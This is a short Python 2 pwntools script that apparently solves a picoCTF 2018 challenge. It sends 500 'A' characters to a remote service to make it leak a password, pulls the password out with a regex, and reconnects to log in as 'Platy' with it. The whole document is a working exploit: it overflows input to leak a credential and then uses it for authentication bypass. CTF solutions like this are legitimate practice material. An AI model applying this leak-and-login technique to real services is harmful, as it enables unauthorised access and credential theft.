from pwn import *
import re
import time

s = remote('2018shell1.picoctf.com', 31045)
print s.recv()
s.sendline('A' * 500)

time.sleep(0.5)

pwd = s.recv()
print pwd
pwd = re.findall(r'A+,(.+)', pwd)[0].strip()
s.close()

s = remote('2018shell1.picoctf.com', 31045)
print s.recv()
s.sendline('Platy')
print s.recv()
s.sendline(pwd)
time.sleep(0.5)
print s.recv()

s.close()
